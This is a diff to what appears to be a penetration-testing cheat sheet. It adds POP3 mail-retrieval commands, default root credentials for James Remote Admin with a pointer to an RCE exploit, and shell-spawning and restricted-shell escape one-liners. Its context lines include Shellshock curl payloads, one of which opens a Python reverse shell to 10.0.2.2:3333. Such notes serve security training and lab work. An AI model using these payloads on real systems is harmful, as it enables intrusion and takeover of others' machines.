@@ -39,10 +39,20 @@ curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; ec
 curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.2\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://localhost:8080/cgi-bin/shellshock_test.sh
 ```
 
-### POP3
+### POP3 [110 TCP]
 
 Post Office Protocol (ver 3) is an application layer protocol used to download emails from a remote server to your local device.
 
+Useful commands
+```
+$ telnet [target] 110
+> USER [username]
++ OK
+> PASS [pass]
++ OK
+> LIST               # list all messages
+> RETR [message no.] # retrieve email
+```
 
 ### SMB/Samba [139, 445 TCP]
 
@@ -84,10 +94,28 @@ $ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -db volume -wi
 $ sqsh -S <IP> -U <Username> -P <Password> -D <Database>
 ```
 
+### James Remote Admin [4555]
+
+Default credentials are `root` / `root`.
+
+If `version 2.3.3` then vulnerable to [RCE - SEE HERE](https://packetstormsecurity.com/files/164313/Apache-James-Server-2.3.2-Remote-Command-Execution.html).
+
 ## Shells
 
 Tricks
 * Try to URL encode payload if exploit is not working in webapp.
+
+Spawn TTY shell / rbash restricted shell escape
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+echo os.system('/bin/bash')
+/bin/sh -i
+perl —e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+:!bash                       # within vi
+:set shell=/bin/bash:shell   # within vi
+!sh                          # within nmap)
+```
 
 Web shell + SMB exec
 ```
